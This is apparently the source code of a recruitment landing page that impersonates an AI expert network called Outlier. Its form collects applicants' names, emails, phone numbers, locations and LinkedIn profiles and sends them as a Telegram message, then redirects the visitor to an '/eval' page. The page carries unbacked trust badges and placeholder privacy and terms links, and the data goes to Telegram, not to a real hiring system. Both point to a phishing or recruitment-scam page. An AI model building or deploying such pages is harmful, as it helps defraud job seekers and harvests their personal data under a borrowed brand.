"use client";

import { useState, FormEvent, ChangeEvent } from "react";
import { useRouter } from "next/navigation";
import { sendTelegramMessage } from "../../utils/telegram";

export default function OutlierRecruitmentPage() {
  const [formData, setFormData] = useState({
    fullName: "",
    email: "",
    phone: "",
    location: "",
    linkedin: "",
    currentTitle: "",
    yearsExperience: "",
    expertise: "",
  });

  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const router = useRouter();

  const handleChange = (
    e: ChangeEvent<HTMLInputElement | HTMLSelectElement | HTMLTextAreaElement>
  ) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault();
    setError("");
    setLoading(true);

    if (!formData.fullName.trim() || !formData.email.trim() || !formData.phone.trim()) {
      setError("Please fill in all required fields.");
      setLoading(false);
      return;
    }

    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(formData.email)) {
      setError("Please enter a valid email address.");
      setLoading(false);
      return;
    }

    const message = `
🚀 New Outlier Application

👤 Name: ${formData.fullName}
✉️ Email: ${formData.email}
📞 Phone: ${formData.phone}
📍 Location: ${formData.location || "Not provided"}
🔗 LinkedIn: ${formData.linkedin || "None"}
💼 Current Title: ${formData.currentTitle || "Not provided"}
⏳ Experience: ${formData.yearsExperience || "Not provided"}
🧠 Key Expertise: ${formData.expertise || "Not provided"}
    `.trim();

    try {
      await sendTelegramMessage(message);
      router.push("/eval");
    } catch (err) {
      console.error(err);
      setError("Failed to submit application. Please try again.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-b from-slate-50 to-white text-gray-900">
      {/* Header with simple logo and trust badge */}
      <header className="border-b border-gray-200 bg-white/80 backdrop-blur-sm sticky top-0 z-10">
        <div className="max-w-7xl mx-auto px-6 py-4 flex justify-between items-center">
          <div className="flex items-center gap-2">
            <span className="text-2xl font-bold bg-gradient-to-r from-blue-600 to-indigo-600 bg-clip-text text-transparent">
              Outlier
            </span>
            <span className="text-xs font-medium bg-blue-50 text-blue-700 px-2 py-0.5 rounded-full">
              AI Expert Network
            </span>
          </div>
          <div className="text-sm text-gray-500 hidden sm:block">
            ✨ Trusted by 10,000+ experts
          </div>
        </div>
      </header>

      <main className="max-w-7xl mx-auto px-6 py-12 md:py-20">
        {/* Two‑column layout: benefits left, form right */}
        <div className="grid md:grid-cols-2 gap-12 lg:gap-16 items-start">
          {/* Left column – value proposition */}
          <div className="space-y-8">
            <div>
              <div className="inline-flex items-center gap-2 bg-blue-100 text-blue-800 text-sm font-medium px-3 py-1 rounded-full mb-4">
                🤖 Now hiring worldwide
              </div>
              <h1 className="text-4xl md:text-5xl font-bold tracking-tight leading-tight">
                Train AI with your expertise
              </h1>
              <p className="mt-4 text-lg text-gray-600">
                Join Outlier, the expert network powering the world’s most advanced AI models.
                Work remotely, set your own hours, and get paid for your knowledge.
              </p>
            </div>

            <div className="space-y-4">
              <div className="flex items-start gap-3">
                <div className="text-blue-600 mt-1">✓</div>
                <div>
                  <h3 className="font-semibold">Competitive compensation</h3>
                  <p className="text-gray-600 text-sm">Earn hourly rates that reflect your expertise.</p>
                </div>
              </div>
              <div className="flex items-start gap-3">
                <div className="text-blue-600 mt-1">✓</div>
                <div>
                  <h3 className="font-semibold">Flexible schedule</h3>
                  <p className="text-gray-600 text-sm">Work 5–40 hours/week, whenever it fits your life.</p>
                </div>
              </div>
              <div className="flex items-start gap-3">
                <div className="text-blue-600 mt-1">✓</div>
                <div>
                  <h3 className="font-semibold">Skill-based matching</h3>
                  <p className="text-gray-600 text-sm">We match you with projects that fit your background.</p>
                </div>
              </div>
            </div>

            <div className="pt-4 border-t border-gray-100">
              <div className="flex flex-wrap gap-6 text-sm text-gray-500">
                <div className="flex items-center gap-1">
                  <span>🔒</span> GDPR & CCPA compliant
                </div>
                <div className="flex items-center gap-1">
                  <span>🌍</span> 50+ countries supported
                </div>
              </div>
            </div>
          </div>

          {/* Right column – application form */}
          <div className="bg-white rounded-2xl shadow-xl border border-gray-100 p-6 md:p-8">
            <div className="mb-6">
              <h2 className="text-2xl font-semibold">Apply to become an expert</h2>
              <p className="text-gray-500 text-sm mt-1">
                Fill out the form below. Our team will review your profile and send you a personalized onboarding link.
              </p>
            </div>

            {error && (
              <div className="mb-6 bg-red-50 border border-red-200 text-red-700 px-4 py-3 rounded-xl text-sm">
                {error}
              </div>
            )}

            <form onSubmit={handleSubmit} className="space-y-5">
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">
                  Full Name <span className="text-red-500">*</span>
                </label>
                <input
                  type="text"
                  name="fullName"
                  value={formData.fullName}
                  onChange={handleChange}
                  placeholder="Jane Smith"
                  className="w-full px-4 py-2.5 rounded-xl border border-gray-300 focus:border-blue-500 focus:ring-2 focus:ring-blue-200 outline-none transition"
                  required
                />
              </div>

              <div className="grid grid-cols-1 sm:grid-cols-2 gap-5">
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-1">
                    Email <span className="text-red-500">*</span>
                  </label>
                  <input
                    type="email"
                    name="email"
                    value={formData.email}
                    onChange={handleChange}
                    placeholder="jane@email.com"
                    className="w-full px-4 py-2.5 rounded-xl border border-gray-300 focus:border-blue-500 focus:ring-2 focus:ring-blue-200 outline-none transition"
                    required
                  />
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-1">
                    Phone <span className="text-red-500">*</span>
                  </label>
                  <input
                    type="tel"
                    name="phone"
                    value={formData.phone}
                    onChange={handleChange}
                    placeholder="+1 (555) 123-4567"
                    className="w-full px-4 py-2.5 rounded-xl border border-gray-300 focus:border-blue-500 focus:ring-2 focus:ring-blue-200 outline-none transition"
                    required
                  />
                </div>
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">
                  Location (City/Country)
                </label>
                <input
                  type="text"
                  name="location"
                  value={formData.location}
                  onChange={handleChange}
                  placeholder="Winnipeg, Canada"
                  className="w-full px-4 py-2.5 rounded-xl border border-gray-300 focus:border-blue-500 focus:ring-2 focus:ring-blue-200 outline-none transition"
                />
              </div>

              <div className="grid grid-cols-1 sm:grid-cols-2 gap-5">
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-1">
                    LinkedIn (optional)
                  </label>
                  <input
                    type="url"
                    name="linkedin"
                    value={formData.linkedin}
                    onChange={handleChange}
                    placeholder="https://linkedin.com/in/..."
                    className="w-full px-4 py-2.5 rounded-xl border border-gray-300 focus:border-blue-500 focus:ring-2 focus:ring-blue-200 outline-none transition"
                  />
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-1">
                    Years of experience
                  </label>
                  <select
                    name="yearsExperience"
                    value={formData.yearsExperience}
                    onChange={handleChange}
                    className="w-full px-4 py-2.5 rounded-xl border border-gray-300 focus:border-blue-500 focus:ring-2 focus:ring-blue-200 outline-none bg-white"
                  >
                    <option value="">Select...</option>
                    <option value="0-2">0 – 2 years</option>
                    <option value="3-5">3 – 5 years</option>
                    <option value="6-9">6 – 9 years</option>
                    <option value="10+">10+ years</option>
                  </select>
                </div>
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">
                  Area of expertise
                </label>
                <textarea
                  name="expertise"
                  value={formData.expertise}
                  onChange={handleChange}
                  placeholder="e.g., Software Engineering, Biology, Creative Writing, Finance, etc."
                  rows={3}
                  className="w-full px-4 py-2.5 rounded-xl border border-gray-300 focus:border-blue-500 focus:ring-2 focus:ring-blue-200 outline-none resize-y"
                />
                <p className="text-xs text-gray-400 mt-1">
                  Helps us match you with relevant projects.
                </p>
              </div>

              <button
                type="submit"
                disabled={loading}
                className="w-full py-3 bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-700 hover:to-indigo-700 disabled:from-gray-300 disabled:to-gray-300 text-white font-semibold text-base rounded-xl transition-all shadow-sm"
              >
                {loading ? (
                  <span className="flex items-center justify-center gap-2">
                    <svg
                      className="animate-spin h-5 w-5 text-white"
                      xmlns="http://www.w3.org/2000/svg"
                      fill="none"
                      viewBox="0 0 24 24"
                    >
                      <circle
                        className="opacity-25"
                        cx="12"
                        cy="12"
                        r="10"
                        stroke="currentColor"
                        strokeWidth="4"
                      ></circle>
                      <path
                        className="opacity-75"
                        fill="currentColor"
                        d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"
                      ></path>
                    </svg>
                    Submitting...
                  </span>
                ) : (
                  "Submit application →"
                )}
              </button>
            </form>

            <p className="text-center text-gray-500 text-xs mt-6">
              By submitting, you agree to our{" "}
              <a href="#" className="underline hover:text-gray-700">
                Privacy Policy
              </a>{" "}
              and{" "}
              <a href="#" className="underline hover:text-gray-700">
                Terms of Service
              </a>
              .
            </p>
          </div>
        </div>
      </main>

      <footer className="border-t border-gray-200 mt-16 py-8 text-center text-sm text-gray-500">
        <div className="max-w-7xl mx-auto px-6">
          © {new Date().getFullYear()} Outlier AI Expert Network. All rights reserved.
        </div>
      </footer>
    </div>
  );
}